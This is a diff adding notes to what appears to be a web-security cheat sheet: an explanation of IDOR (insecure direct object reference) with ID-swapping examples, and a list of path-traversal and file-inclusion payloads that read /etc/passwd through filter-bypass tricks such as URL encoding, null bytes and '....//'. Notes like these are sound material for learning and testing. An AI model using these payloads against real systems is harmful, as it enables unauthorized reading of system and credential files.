@@ -53,3 +53,42 @@ Special characters
 | --------- | ------------------- | --------------------------------------- |
 | \*        | site:\*.website.com | any possible alphanumeric strings       |
 | -         | -site:website.com   | used before an operator to obtain a not |
+
+## IDOR
+
+IDOR stands for Insecure Direct Object Reference and is a type of vulnerability based on unathorized resource access.
+
+For example, if you can retrieve your profile by going to `/user/1000` you could try to change the id with other numbers like `/user/1001`.
+We have an IDOR if it is possible to access other profiles without authorization.
+
+IDORs attacks are not always evident:
+
+- data could be encoded with base64 or hashed with MD5 or SHA-1
+- a parameter could be hidden
+- a server request could have a vulnerable body or param
+
+A good way to check for an IDOR vulnerability is to create two accounts and see if using one of them you can access the other's private data.
+
+## File inclusion
+
+```bash
+# simple dot-dot-slash notation
+../../../etc/passwd
+
+# ascii notation
+%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
+
+# truncate string (PHP < 5.3.4) using null byte
+../../../etc/passwd0x00
+../../../etc/passwd%00
+../../../etc/passwd\0
+
+# if validation is done over the first 'etc' match and right after string
+../../../etc/../etc/passwd
+
+# if '/etc/passwd' is filtered
+../../../etc/./passwd
+
+# if '../' is removed
+....//....//....//....//....//etc/passwd
+```
